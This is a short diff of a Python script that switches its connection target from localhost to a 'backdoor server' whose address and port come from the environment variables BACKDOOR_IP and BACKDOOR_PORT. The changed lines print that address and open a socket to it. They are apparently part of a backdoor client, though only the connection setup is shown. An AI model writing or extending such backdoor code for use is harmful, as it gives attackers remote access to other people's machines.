@@ -7,8 +7,11 @@ from time import sleep
 import json
 from urllib import request
 
-IP = socket.gethostbyname("localhost")
-PORT = 80
+IP = os.environ['BACKDOOR_IP']
+PORT = os.environ['BACKDOOR_PORT']
+
+print("BACKDOOR SERVER IP: " + IP)
+print("BACKDOOR SERVER PORT: " + PORT)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((IP, int(PORT)))
